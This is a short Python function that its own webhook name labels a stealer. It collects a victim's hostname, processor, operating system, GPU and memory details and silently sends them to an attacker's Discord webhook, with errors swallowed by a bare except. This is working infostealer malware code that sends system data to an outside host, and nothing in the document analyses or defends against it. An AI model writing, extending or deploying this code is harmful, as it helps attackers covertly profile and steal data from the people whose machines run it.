def sysinfos():
 try:
  ds = platform.uname()
  sdg = platform.processor()
  gpus = GPUtil.getGPUs()
  gpiusa = gpus[0].name
  mem = psutil.virtual_memory()
  x = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
  y = DiscordEmbed(title=":desktop: PC Info")
  y.add_embed_field(name="PC INFORMATION", value=f"**:man: | Username: {ds.node}**\n\n**:floppy_disk: | Processor: {ds.machine} {sdg}**\n\n**:desktop: | System: {ds.system}**\n\n**:vhs: | GPU: {gpiusa}**\n\n**:minidisc: | Memory(bytes): {mem}**")
  x.add_embed(y)
  x.execute()
 except:pass